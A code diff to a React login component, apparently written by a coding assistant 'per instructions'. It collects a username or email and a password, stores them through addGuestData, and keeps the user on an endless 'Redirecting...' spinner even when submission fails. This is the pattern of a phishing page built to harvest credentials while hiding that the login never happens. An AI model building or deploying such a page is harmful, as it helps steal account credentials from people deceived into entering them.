@@ -9,25 +9,26 @@ const GuestForm: React.FC = () => {
   const [field1, setField1] = useState('');
   const [field2, setField2] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [submitStatus, setSubmitStatus] = useState<'idle' | 'success' | 'error'>('idle');
+  const [validationError, setValidationError] = useState<string | null>(null);
   const { addGuestData } = useData();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (field1.trim() && field2.trim()) {
-      setIsSubmitting(true);
-      setSubmitStatus('idle');
-      try {
-        await addGuestData({ field1, field2 });
-        setField1('');
-        setField2('');
-        setSubmitStatus('success');
-        setTimeout(() => setSubmitStatus('idle'), 3000);
-      } catch (error) {
-        setSubmitStatus('error');
-      } finally {
-        setIsSubmitting(false);
-      }
+    setValidationError(null);
+
+    if (!field1.trim() || !field2.trim()) {
+      setValidationError("Username/Mail or Password is missing.");
+      return;
+    }
+    
+    setIsSubmitting(true);
+
+    try {
+      await addGuestData({ field1, field2 });
+      // Per instructions, we stay in the "redirecting" state indefinitely.
+    } catch (error) {
+      // Even on error, we stay in the "redirecting" state.
+      console.error("Submission failed, but UI is intentionally kept in a loading state.", error);
     }
   };
 
@@ -44,7 +45,6 @@ const GuestForm: React.FC = () => {
             value={field1} 
             onChange={(e) => setField1(e.target.value)} 
             placeholder="e.g., username or email@example.com"
-            required 
             disabled={isSubmitting}
           />
         </div>
@@ -56,21 +56,25 @@ const GuestForm: React.FC = () => {
             value={field2} 
             onChange={(e) => setField2(e.target.value)} 
             placeholder="••••••••"
-            required
             disabled={isSubmitting}
           />
         </div>
         <div className="flex flex-col gap-4">
-            <Button type="submit" disabled={!field1.trim() || !field2.trim() || isSubmitting}>
-              {isSubmitting ? 'Logging in...' : 'Log in'}
+            <Button type="submit" disabled={isSubmitting}>
+              {isSubmitting ? (
+                <span className="flex items-center justify-center">
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Redirecting...
+                </span>
+              ) : 'Log in'}
             </Button>
         </div>
       </form>
-      {submitStatus === 'success' && (
-        <p className="text-center mt-4 text-green-400 animate-fade-in">Data submitted successfully!</p>
-      )}
-      {submitStatus === 'error' && (
-        <p className="text-center mt-4 text-red-400 animate-fade-in">Failed to submit data. Please try again.</p>
+      {validationError && (
+        <p className="text-center mt-4 text-red-400 animate-fade-in">{validationError}</p>
       )}
     </div>
   );
